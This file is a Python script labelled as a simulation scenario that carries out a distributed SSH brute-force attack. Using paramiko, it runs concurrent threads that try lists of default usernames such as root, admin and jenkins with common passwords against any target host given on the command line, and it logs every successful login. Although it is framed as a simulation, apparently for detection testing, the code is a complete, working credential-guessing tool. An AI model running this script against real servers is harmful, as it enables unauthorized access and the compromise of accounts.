"""
Scenario 2: Distributed SSH Brute-Force Attack Simulation

Simulates a coordinated brute-force from multiple source threads,
mimicking a distributed attack from multiple IPs.

Usage:
    python brute_force_distributed.py --target 192.168.1.100 --threads 5
"""

import argparse
import time
import logging
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import paramiko
except ImportError:
    import sys
    print("Install paramiko: pip install paramiko")
    sys.exit(1)

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(threadName)s] %(message)s')
logger = logging.getLogger(__name__)

USERNAMES = ['root', 'admin', 'ubuntu', 'test', 'user', 'deploy', 'jenkins', 'git']
PASSWORDS = ['password', '123456', 'root', 'admin', 'toor', 'pass123', 'qwerty',
             'letmein', 'welcome', '1234', 'changeme', 'default']


def attack_thread(target: str, port: int, username: str, passwords: list,
                  delay: float, thread_id: int):
    """Single attacker thread."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    results = {'attempts': 0, 'success': False}

    for password in passwords:
        results['attempts'] += 1
        try:
            client.connect(
                hostname=target, port=port,
                username=username, password=password,
                timeout=3, look_for_keys=False, allow_agent=False,
            )
            logger.warning(f"[Thread-{thread_id}] SUCCESS: {username}:{password}")
            results['success'] = True
            client.close()
            return results
        except paramiko.AuthenticationException:
            logger.info(f"[Thread-{thread_id}] FAILED: {username}:{password}")
        except Exception as e:
            logger.debug(f"[Thread-{thread_id}] Error: {e}")
        finally:
            client.close()

        time.sleep(delay)

    return results


def run_distributed_attack(
    target: str,
    port: int = 22,
    threads: int = 5,
    rate_per_thread: float = 5,
    max_attempts_per_thread: int = 12,
):
    """Run distributed brute-force simulation.

    Args:
        target: Target SSH server
        port: SSH port
        threads: Number of concurrent attacker threads
        rate_per_thread: Attempts per second per thread
        max_attempts_per_thread: Max attempts per thread
    """
    delay = 1.0 / rate_per_thread

    logger.info(f"=== Distributed Brute-Force Simulation ===")
    logger.info(f"Target: {target}:{port}")
    logger.info(f"Threads: {threads}")
    logger.info(f"Rate/thread: {rate_per_thread} att/s")
    logger.info(f"Total max attempts: {threads * max_attempts_per_thread}")
    logger.info(f"Starting at: {datetime.now().isoformat()}")
    logger.info(f"{'='*50}")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for i in range(threads):
            username = USERNAMES[i % len(USERNAMES)]
            pw_slice = PASSWORDS[:max_attempts_per_thread]
            futures.append(
                executor.submit(attack_thread, target, port, username, pw_slice, delay, i)
            )

        total_attempts = 0
        for future in as_completed(futures):
            result = future.result()
            total_attempts += result['attempts']

    logger.info(f"Attack completed. Total attempts: {total_attempts}")
    logger.info(f"Finished at: {datetime.now().isoformat()}")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Distributed SSH Brute-Force Simulation')
    parser.add_argument('--target', required=True)
    parser.add_argument('--port', type=int, default=22)
    parser.add_argument('--threads', type=int, default=5)
    parser.add_argument('--rate', type=float, default=5)
    parser.add_argument('--max-attempts', type=int, default=12)
    args = parser.parse_args()

    run_distributed_attack(
        target=args.target, port=args.port, threads=args.threads,
        rate_per_thread=args.rate, max_attempts_per_thread=args.max_attempts,
    )
